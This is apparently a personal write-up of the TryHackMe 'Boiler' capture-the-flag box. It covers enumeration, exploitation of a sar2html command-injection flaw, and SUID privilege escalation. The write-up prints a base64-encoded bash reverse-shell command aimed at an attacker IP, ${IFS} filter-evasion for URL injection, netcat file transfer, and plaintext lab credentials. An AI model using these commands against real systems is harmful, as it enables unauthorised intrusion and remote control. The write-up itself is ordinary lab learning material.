# Boiler CTF

This was my first Medium CTF from TryHackMe! Despite the small frustration from the large amount of enumeration, the vulnerability was really unique and interesting!

## Enumeration

### Initial detailed nmap scan:
![26_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/7363130b-ecde-47ba-84a3-a212cd9fef38)

We have an interesting service on port 10000 - that being http. Looks like we have two http ports open, let's enumerate both of them.

Before we continue though, I like to run an nmap scan of every port to see if anything pops up at me.

![31_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/29a92a19-d86a-4301-b1a0-af47536224d8)

Looks like we have an open port on 55007.

Let’s check out this port:

![Untitled](https://github.com/NTHSec/CTF-Writeups/assets/150489159/e5ceb9fb-90ad-4f09-ac0e-bf40022371af)

Looks like it was an ssh port hiding from us! I assume that we’re going to be using this later, so let's keep it in mind.

### Port 80/tcp:

Our first page is just a default apache page.

![44_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/37086fa1-985f-42ff-87a7-828dcd45ada3)

There is nothing interesting in the source code, but if we run a gobuster scan to enumerate hiding subdirectories, we find a bunch of cool stuff:

![46_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/24ade074-49c9-486b-b05a-b9417fbbcaf9)

We’re going to check each of these out in info gathering, but for now, we’re going to note what we have and move on:

- /joomla
- /manual
- /robots.txt

### Port 10000/tcp:

Our second http port looks like this:

![53_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/266b0a16-4f87-4e5d-bc13-984d240a7ac7)

The URL it suggests also leads to an error. Looks like this isn’t going to help us as of now.

## Info Gathering

### FTP: Logging in as Anonymous and checking for hidden files

![62_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/28622774-8d6a-407e-8d92-7e836f92e7c6)

Transferring this file onto our local machine with `get` and examining it:

![65_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8a5fe338-a0d4-4a14-9a88-08d440f8ce1c)

Decrypting in CyberChef:

![67_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/651ef822-d0b4-40bf-9553-47aa81bd285e)

Looks like it is a note from the maker of this box, it’s a nice hint though! Let’s continue.

### Port 80

So from our enumeration step we found out that we’re examining 3 different subdomains:

- /joomla
- /manual
- /robots.txt

So let’s check them out. First let’s look at `joomla`.

### Joomla

This is what our Joomla site looks like:

![81_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/5532dfc5-d68f-46ac-9f02-bf73dc92ed7a)

**Interesting Stuff:**

The only thing catching my eye is the login form. We can do a ton of tests on this later, but for now, we can just note it down.

![84_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/78d3cf88-0a32-467c-a55c-b7818dea08b8)

### More enumeration. Based on the hint we got earlier, I decided to run another gobuster scan, and we got a ton back!

![87_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/2898eac6-886c-48d8-a1f5-5a126c41733c)

### **_files:**

![101_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/bf53041a-c63e-42d5-9a1c-50d0c069728c)

Decrypting in CyberChef:

![102_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/bd55819e-e460-42f0-bf73-31444ced3b01)


Simply decodes to whoopsie daisy. Possible credentials? Who knows! Looks like the creator of this box is just messing around with us.

### **_test:**

The only thing that caught my eye here was this new button.

![106_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/2ae03f8b-3a48-4bcc-988c-2ea894d6a31d)

When we press the new button, we can upload a file!

![109_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/b32bb6a6-6d18-4343-b030-70371c6368e3)

My first thought is uploading a php reverse shell, but before we jump into any exploitation, let’s keep enumerating and seeing what else we can find.

### ~www

I feel like this was unnecessary haha

![113_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/4dcda998-5e5c-480c-ba4e-abf549daa690)


### _database

Another ROT13 encryped message — onto the next!

![115_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/bf28187d-1e84-4166-9fe6-80b1064014f0)

![116_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d7afa10a-1406-4e20-9058-c00d2ec0ad32)

### administrator

Looks like an actual admin login page, though we don’t have any credentials yet. If needed, we can brute force this page with the default joomla username of ‘admin’.

![118_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/69919965-759e-4c3a-847b-f518ebda4658)

### _archive

Another one of these!

![113_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/e52ce958-bef7-480d-aa8e-78517dbb5e0b)

### bin

This subdirectory was just a blank page.

### build

We have a ton of stuff here - looks like some of the inner workings of the website. Nothing that I saw in here that we can use for exploitation though.

![123_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/aea780a1-809d-47e9-8275-58f1d41951ee)

### cache, components

Both blank pages

### installation

Both the site button and the administrator button lead to pages we already know. I haven’t dared to press the remove installations folder button.

![127_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/ef5add52-eff6-4b04-900d-9338eac3ff6d)

After some more enumeration, I found these credentials at /joomla/installation/sql/mysql/

![130_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/9489a15c-77fb-4db7-939d-203b6c25ec9c)

However, admin:bobby7 does not yield any results when trying to login on the admin page. 

### tests

There is so much stuff here, wow!

![133_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/9c07c33d-e065-4e4f-935d-f9ef23208e6d)

### Manual

Simply a manual page

![135_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/01052be9-3a0a-4c9a-ac4a-7b494c6b0fbf)

### robots.txt

lastly, we have our robots.txt file, with of course some more taunting messages. The subdirectories in here doesn't really lead anywhere though, so unfortunately robots.txt doesn't help us out a ton.

![137_image](https://github.com/NTHSec/CTF-Writeups/assets/150489159/bad3e47e-ea85-4b6c-b95e-0a86ab6cda3b)

looks like a bunch of subdirectories and some ascii.

The ASCII converts to `OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK`. Unfortunately, though, this doesn’t really lead us anywhere, as this string can’t be decoded in base64, or any other method that I tried.


# Exploitation (Method 1)

WOW! So that was a lot of enumeration. Let's step back and take a look at what we gathered from all of that. 

Here are our possible exploitation avenues:

1. Upload php revshell to /joomla/_test
2. Other interaction with _test
3. Brute force Joomla Login through /administrator

My first thought of uploading a php shell to the sar2html directory didn't work, I'm assuming this is because sar2html expects files that AREN'T php files.

Despite this though, there is still a vulnerability! This [article](https://www.exploit-db.com/exploits/47204) shows us how we can abuse sar2html to execute arbitrary commands!

Following this article, let’s run a quick ls and see what happens:

![ls](https://github.com/NTHSec/CTF-Writeups/assets/150489159/a2ba95de-b324-42c8-94c9-7ceed9f8a6ac)

Our ls shows that we have a file called log.txt. Running `cat` in the same manner we get some credentials!

![cat log](https://github.com/NTHSec/CTF-Writeups/assets/150489159/3e18402b-605a-4b40-971b-1bfdac2e63d7)

Looking back earlier, we know that we have an SSH port open on port 55007! Let’s try out these credentials.

basterd:superduperp@$$

![ssh](https://github.com/NTHSec/CTF-Writeups/assets/150489159/071758ba-6ffa-4967-8f41-354b0e69cf7f)

we’re in! Let’s stabilize our shell.

`python3 -c 'import pty;pty.spawn("/bin/bash")'` 

Taking a look at the users on this box, we have root and stoner.

![etc passwd](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8a02d8bf-a903-4de2-89c3-fb6cfc0886fd)

# Lateral Movement / Privilege Escalation

Now that we have our initial foothold, it is time to try and move to the stoner user, and then from there escalate to root.

Our first step is to run linpeas.

### Victim Machine:
`nc -lnvp 1234 > linpeas.sh`

### Attacker Machine:
`nc {victim_ip} 1234 < linpeas.sh`

Now you have linpeas on the victim machine. We can give it executable permissions with `chmod +x linpeas.sh`, and run it with `./linpeas.sh`.

Looks like linpeas found something!

![linpeas](https://github.com/NTHSec/CTF-Writeups/assets/150489159/7ffeeedb-8460-4ce2-b8db-fb70e22641fe)

Here is the GTFO bins page for the `find` binary:

![gtfobins](https://github.com/NTHSec/CTF-Writeups/assets/150489159/e7826a05-0e1d-4c39-bec0-def05228c939)

If we run the second command we have root!

![root](https://github.com/NTHSec/CTF-Writeups/assets/150489159/43d64d77-ba9a-47dc-ad34-fcedb55aa4d5)

Funny how we completely skipped getting the `stoner` user and we were able to root the box as the low-level user!

If you took my approach and are still looking for the user flag, you can find it in /home/stoner after running a quick ls -la!

# Exploitation (Method 2)

This second exploitation method is using the same command execution as before, but we are injecting a URL encoded reverse shell into the URL. We can do this in 5 steps!

1. base64 encoding our shell:

![base64 shell](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8eb30b9a-c864-4585-a64c-d47de2b24380)

This means our new command looks like this:
```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjExMy4yNTQvNDQ0NCAwPiYxCg==" | base64 -d | bash
```

2. Replace spaces with `{IFS%??}` 
    a. Note: the syntax **`${IFS%??}`** is used to manipulate the IFS variable, ensuring that spaces are not included in the command execution. This is particularly important when dealing with commands passed as strings, where spaces might interfere with the intended behavior of the command.

3. Use any [URL Encoder](https://www.urlencoder.org/) to URL encode your script - it should look like this:
   
![url encoder](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d4662c17-d4f2-4ec0-ab18-2fe836d8f7ad)

4. Start your listener:
   
![listener](https://github.com/NTHSec/CTF-Writeups/assets/150489159/ecc2cd2c-9907-4a68-a144-53b370d12ad3)

5. Input your URL encoded script in the `plot=` parameter in the /joomla/_test URL and press enter! And here we have our reverse shell!

![were in!](https://github.com/NTHSec/CTF-Writeups/assets/150489159/6ffc5a0c-55f6-4d74-8e6a-2df12642323a)

From here, you can get root even faster because you don’t even need to bother sshing into a user. You can run linpeas and use the GTFOBins SUID privesc command and get root in the reverse shell!

![root2](https://github.com/NTHSec/CTF-Writeups/assets/150489159/4cd5f8db-0085-4d8a-abcc-b7de044a5814)


Hope everyone has a lovely day! Happy Hacking!
